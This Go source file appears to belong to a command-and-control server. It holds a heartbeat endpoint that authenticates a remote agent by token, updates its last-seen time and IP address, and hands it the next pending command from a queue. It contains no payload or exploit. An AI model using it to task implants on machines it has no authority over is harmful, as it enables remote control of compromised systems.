package agent

import (
	"c2/database"
	"c2/utils"
	"encoding/json"
	"net/http"
	"time"
)

type HeartbeatRequest struct {
	LastSeen  time.Time `json:"last_seen"`
	IPAddress string    `json:"ip_address"`
}

// Heartbeat handles the agent's heartbeat signal to update the agent status.
// @Summary Heartbeat from agent
// @Description Receives a heartbeat signal from the agent, updates the agent status, and checks for pending commands.
// @Accept json
// @Produce json
// @Param Authorization header string true "Authorization token for the agent"
// @Param heartbeat body HeartbeatRequest true "Heartbeat request body"
// @Success 200 {object} map[string]interface{} "Heartbeat response with agent status and pending command"
// @Failure 400 {string} string "Bad Request: Invalid input"
// @Failure 401 {string} string "Unauthorized: Missing or invalid token"
// @Failure 404 {string} string "Agent not found"
// @Failure 500 {string} string "Internal Server Error"
// @Router /agent/heartbeat [post]
func Heartbeat(w http.ResponseWriter, r *http.Request) {
	tokenString := r.Header.Get("Authorization")
	if tokenString == "" {
		utils.LogError("Missing Authorization header in Heartbeat")
		http.Error(w, "Unauthorized: Missing Authorization header", http.StatusUnauthorized)
		return
	}

	agentID, err := utils.VerifyToken(tokenString)
	if err != nil {
		utils.LogError("Invalid token in Heartbeat: " + err.Error())
		http.Error(w, "Unauthorized: Invalid token", http.StatusUnauthorized)
		return
	}

	var req HeartbeatRequest
	err = json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		utils.LogError("Invalid input in Heartbeat: " + err.Error())
		http.Error(w, "Bad Request: Invalid input", http.StatusBadRequest)
		return
	}

	db := database.Connect()
	defer db.Close()

	var count int
	err = db.QueryRow("SELECT COUNT(*) FROM agents WHERE id = ?", agentID).Scan(&count)
	if err != nil || count == 0 {
		utils.LogError("Agent not found in database: " + agentID)
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	_, err = db.Exec(`UPDATE agents SET last_seen = ?, ip = ? WHERE id = ?`,
		req.LastSeen, req.IPAddress, agentID)
	if err != nil {
		utils.LogError("Error updating agent last_seen in Heartbeat: " + err.Error())
		http.Error(w, "Internal Server Error: Unable to update agent", http.StatusInternalServerError)
		return
	}

	var cmd database.Command
	row := db.QueryRow(`
		SELECT id, agent_id, command, status, result, created_at, executed_at
		FROM commands
		WHERE agent_id = ? AND status = 'pending'
		ORDER BY created_at ASC
		LIMIT 1
	`, agentID)

	err = row.Scan(
		&cmd.ID,
		&cmd.AgentID,
		&cmd.Command,
		&cmd.Status,
		&cmd.Result,
		&cmd.CreatedAt,
		&cmd.ExecutedAt,
	)

	response := map[string]interface{}{
		"message":   "Heartbeat received successfully",
		"agent_id":  agentID,
		"last_seen": req.LastSeen,
	}

	if err == nil {
		response["pending_command"] = cmd
	} else {
		utils.LogInfo("No pending command for agent: " + agentID)
	}

	utils.LogInfo("Heartbeat received successfully from agent: " + agentID)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(response)
}
